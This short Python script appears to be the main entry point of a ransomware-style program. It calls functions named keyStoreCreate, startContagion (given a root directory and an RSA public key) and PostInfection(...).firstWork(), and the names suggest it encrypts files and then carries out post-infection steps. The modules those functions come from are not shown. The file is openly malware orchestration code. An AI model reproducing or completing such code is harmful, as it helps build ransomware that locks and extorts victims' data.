import starter
import utils
from postInfection import PostInfection

starter.keyStoreCreate(utils.version, utils.what_is_my_id)
starter.startContagion(utils.root_directory, utils.rsa_public_key)
PostInfection( utils.what_is_my_id , "offline", utils.when_did_i_work, utils.rsa_public_key).firstWork()